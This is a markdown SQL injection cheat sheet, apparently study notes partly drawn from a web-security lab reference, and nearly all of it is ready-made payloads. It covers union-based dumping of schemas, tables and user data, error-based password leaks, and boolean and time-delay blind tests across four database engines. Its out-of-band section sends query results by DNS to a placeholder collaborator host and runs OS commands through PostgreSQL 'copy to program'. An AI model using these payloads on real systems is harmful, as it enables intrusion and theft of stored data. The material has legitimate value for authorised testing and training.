# sqlcheatsheet<br/>
# Terms to remember<br/>
1.information_schema - structure<br/>
2.table_schema - is used for supply database names to filter specific database results<br/>
3.table_name -  is used for supply table names to filter tables in specific database<br/>
4.column_name - is used for supply column names to filter columns in specific table<br/>
5.database() - referering to current database<br/>
6.user() - referering to current user who logged in & running queries<br/>

# Common SQLI Types:<br/>
## 1.Inband or classical<br/>
1a.Error based<br/>
1b.Union based<br/>
## 2.Blind or inferential<br/>
2a.Boolean based<br/>
2b.Delay or Time based<br/>
## 3.Outofband<br/>


# 1. In band or classic sql injection<br/>
1. Error based 2. Union based<br/>
**Error based**<br/>
testing<br/>
Error based sqlinjection<br/>
test ' "<br/>
output(success)<br/>
look for syntax errors<br/>
<br/><br/>
2. **Union based**<br/>
Counting number of columns 2methods <br/>

a. **orderby** (increase the number 1,2,3 so on no error means the number of columns exists if error columns count end ex: ( order by 1--)   --> no error 1columns present, ( order by 2 ) --> no errors 2 columns present, ( order by 3 ) --> error 3 no column present--> so the total columns is 2)
  ' ORDER BY 1--<br/>
  ' ORDER BY 2--<br/>
  ' ORDER BY 3--<br/>
  <br/>
  
b. **null based** (go on increasing null values comma separated, at total number of columns no error until you will get errors ex: (' UNION SELECT NULL--) -->error, (' UNION SELECT NULL,NULL--) -->no error--> it means the total number of columns are 2, (' UNION SELECT NULL,NULL,NULL--)-->error)
  ' UNION SELECT NULL--<br/>
  ' UNION SELECT NULL,NULL--<br/>
  ' UNION SELECT NULL,NULL,NULL--<br/>
NOTE:<br/>
The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.<br/>
On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:<br/>

' UNION SELECT NULL FROM DUAL--<br/>
The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.<br/>
<br/><br/>
# getting database version using null <br/>
'+UNION+SELECT+@@version,+NULL# (total number of columns is 2 --> inoder to do this first find the no.of columns using previous method it works only mysql,mssql)<br/>
for oracle
<br/><br/>
# finding text containing columns<br/>
Use Burp Suite to intercept and modify the request that sets the product category filter.<br/>
Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:<br/>
<br/>
'+UNION+SELECT+NULL,NULL,NULL--<br/>
Try replacing each null with the random value provided by the lab, for example:<br/>
<br/>
'+UNION+SELECT+'abcdef',NULL,NULL--<br/>
If an error occurs, move on to the next null and try that instead.<br/>
<br/><br/>
# Data exfiltration using union based quiries<br/>
### Listing Databases on the server<br/>
``` 1'union+select+null,schema_name,null+FROM+INFORMATION_SCHEMA.SCHEMATA# ```    change the comment based on database to # or -- or /* **and** number of **null** values <br/>

### Listing Tables inside database from above result <br/>
``` 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='[database-name]'# ```     change the comment based on database to # or -- or /* **and** replace the database-name **and** number of **null** values <br/>
**EX:** 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='bankrobber'# <br/>

### Listing columns inside a table from above result <br/>
``` 1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='[table-name]'+and+table_schema='[database-name]'# ```     change the comment based on database to # or -- or /* **and** replace the database-name & table-name **and** number of **null** values <br/>
**EX:**  1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='users'+and+table_schema='bankrobber'# <br/>

### Listing data from the columns from a perticular database<br/>
```1'union+select+null,[column-name],null+FROM+[database-name].[table-name]#```     change the comment based on database to # or -- or /* **and** replace the database-name & table-name & column-name **and** number of **null** values <br/>
**or** 
```1'union+select+null,[column-name],null+FROM+[table-name]#```    change the comment based on database to # or -- or /* **and** replace the table-name & column-name **and** number of **null** values<br/>
**Ex:** 1'union+select+null,username,null+FROM+bankrobber.users# <br/>
**Ex:** 1'union+select+null,username,null+FROM+users# <br/>


<br/><br/>
# 2. Blind or inferential sql injection<br/>

1.Boolean based<br/>
true or false condition based<br/>
'or 1=1#<br/>
2.delay based or time based<br/>
select sleep(5)<br/>
<br/><br/>

# cheat sheet commands <br/>
This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.<br/>
<br/><br/>
**String concatenation**<br/>
You can concatenate together multiple strings to make a single string.<br/>
<br/>
Oracle	'foo'||'bar'<br/>
Microsoft	'foo'+'bar' <br/>
PostgreSQL	'foo'||'bar'<br/>
MySQL	'foo' 'bar' [Note the space between the two strings]<br/>
CONCAT('foo','bar')<br/>

<br/><br/>

**Substring**<br/>
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.<br/>
<br/>
Oracle	SUBSTR('foobar', 4, 2)<br/>
Microsoft	SUBSTRING('foobar', 4, 2)<br/>
PostgreSQL	SUBSTRING('foobar', 4, 2)<br/>
MySQL	SUBSTRING('foobar', 4, 2)<br/>

<br/><br/>
**Comments**<br/>
You can use comments to truncate a query and remove the portion of the original query that follows your input.<br/>
<br/>
Oracle	--comment<br/>
Microsoft	--comment<br/>
/*comment*/<br/>
PostgreSQL	--comment<br/>
/*comment*/<br/>
MySQL	#comment<br/>
-- comment [Note the space after the double dash]<br/>
/*comment*/<br/>
<br/><br/>

**Database version**<br/>
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.<br/>
<br/>
Oracle	SELECT banner FROM v$version<br/>
SELECT version FROM v$instance<br/>
Microsoft	SELECT @@version<br/>
PostgreSQL	SELECT version()<br/>
MySQL	SELECT @@version<br/>

<br/><br/>

**Database contents**<br/>
You can list the tables that exist in the database, and the columns that those tables contain.<br/>
<br/>
Oracle	SELECT * FROM all_tables<br/>
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
Microsoft	SELECT * FROM information_schema.tables<br/>
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
PostgreSQL	SELECT * FROM information_schema.tables<br/>
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
MySQL	SELECT * FROM information_schema.tables<br/>
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
<br/><br/>

**Conditional errors**<br/>
You can test a single boolean condition and trigger a database error if the condition is true.<br/>
<br/>
Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual<br/>
Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END<br/>
PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)<br/>
MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')<br/>
<br/><br/>

**Extracting data via visible error messages**<br/>
You can potentially elicit error messages that leak sensitive data returned by your malicious query.<br/>
<br/>
Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')<br/>
<br/>
Conversion failed when converting the varchar value 'secret' to data type int.<br/>
PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)<br/>
<br/>
 invalid input syntax for integer: "secret"<br/>
MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))<br/>
<br/>
 XPATH syntax error: '\secret'<br/>

<br/><br/>
**Batched (or stacked) queries**<br/>
You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.<br/>
<br/>
Oracle	Does not support batched queries.<br/>
Microsoft	QUERY-1-HERE; QUERY-2-HERE<br/>
PostgreSQL	QUERY-1-HERE; QUERY-2-HERE<br/>
MySQL	QUERY-1-HERE; QUERY-2-HERE<br/>
Note<br/>
With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.<br/>
<br/><br/>

**Time delays**<br/>
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.<br/>
<br/>
Oracle	dbms_pipe.receive_message(('a'),10)<br/>
Microsoft	WAITFOR DELAY '0:0:10'<br/>
PostgreSQL	SELECT pg_sleep(10)<br/>
MySQL	SELECT SLEEP(10)<br/>

<br/><br/>
**Conditional time delays**<br/>
You can test a single boolean condition and trigger a time delay if the condition is true.<br/>
Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual<br/>
Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'<br/>
PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END<br/>
MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')<br/>

<br/><br/>

# 3. Out of Band
**DNS lookup**<br/>
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.<br/>
<br/>
Oracle	<br/>
(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br/>
<br/>
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual<br/>
The following technique works on fully patched Oracle installations, but requires elevated privileges:<br/>
<br/>
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')<br/>
Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'<br/>
PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'<br/>
MySQL	<br/>
The following techniques work on Windows only:<br/>
<br/>
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')<br/>
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'<br/>
DNS lookup with data exfiltration<br/>
You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.<br/>
<br/>
Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual<br/>
Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')<br/>
PostgreSQL	create OR replace function f() returns void as $$<br/>
declare c text;<br/>
declare p text;<br/>
begin<br/>
SELECT into p (SELECT YOUR-QUERY-HERE);<br/>
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';<br/>
execute c;<br/>
END;<br/>
$$ language plpgsql security definer;<br/>
SELECT f();<br/>
MySQL	The following technique works on Windows only:<br/>
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'<br/>

